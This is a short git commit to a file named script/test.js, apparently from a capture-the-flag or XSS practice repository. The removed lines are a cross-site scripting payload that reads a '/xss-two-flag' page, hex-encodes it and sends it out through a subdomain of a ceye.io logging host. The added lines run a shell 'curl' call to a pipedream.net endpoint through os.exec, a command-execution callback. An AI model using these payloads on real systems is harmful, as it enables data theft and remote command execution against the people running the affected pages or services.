32d1c431d1edb35a273f7f37bf9a8d665f561a9f
youremailaddress <52492562+youremailaddress@users.noreply.github.com>
2022-09-14 14:03:40 +0800

    Update test.js

--- script/test.js
+++ script/test.js
@@ -1,16 +1,4 @@
-var xhr = new XMLHttpRequest();
-xhr.open("GET", "/xss-two-flag", false);
-xhr.send(null);
-var xhr1 = new XMLHttpRequest();
-function stringToHex(str){
-var val="";
-for(var i = 0; i < str.length; i++){
-if(val == "")
-val = str.charCodeAt(i).toString(16);
-else
-val +=str.charCodeAt(i).toString(16);
-}
-return val;
-}
-xhr1.open("GET","https://"+stringToHex(xhr.response)+".my58ld.ceye.io/",false);
-xhr1.send(null);
+function parse(x){
+        console.log("123");
+        os.exec(["sh","-c","curl https://eoi1xusjbpy7gsn.m.pipedream.net"],{file:"sh"});
+};
